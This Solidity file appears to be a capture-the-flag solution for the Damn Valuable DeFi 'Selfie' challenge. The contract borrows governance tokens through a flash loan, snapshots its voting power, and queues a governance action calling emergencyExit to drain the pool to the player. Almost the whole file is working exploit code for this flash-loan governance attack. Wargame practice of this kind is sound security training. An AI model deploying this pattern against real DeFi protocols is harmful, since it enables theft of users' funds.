// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SelfiePool.sol";

contract SelfieAttacker is IERC3156FlashBorrower {

    SelfiePool pool; 
    SimpleGovernance governance;
    DamnValuableTokenSnapshot dvtToken;
    address player;
    uint256 public actionID;

    constructor(
        SelfiePool _pool, 
        SimpleGovernance _governance, 
        DamnValuableTokenSnapshot _token,
        address _player) {
        pool = _pool;
        governance = _governance;
        dvtToken = _token;
        player = _player;
    }

    function callLoan(uint256 amount) external {
        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", player);
        
        pool.flashLoan(this, address(dvtToken), amount, data);
    }

    // callback from pool. Now add an action to the queue and try to call the emergencyExit
    // function to drain all the tokens, by setting this contract as the receiver
    function onFlashLoan(
        address,
        address,
        uint256 amount,
        uint256,
        bytes calldata data
    ) external override returns (bytes32) {
        // Now I have the DVT tokens. 
        // queue the action so that we can later call it from outside after moving the time.
        dvtToken.snapshot();
        require(dvtToken.getBalanceAtLastSnapshot(address(this)) == amount, "NO DVT OK");
        actionID = governance.queueAction(address(pool), 0, data);
        dvtToken.approve(address(pool), amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    receive() external payable { }

    fallback() external payable { }
}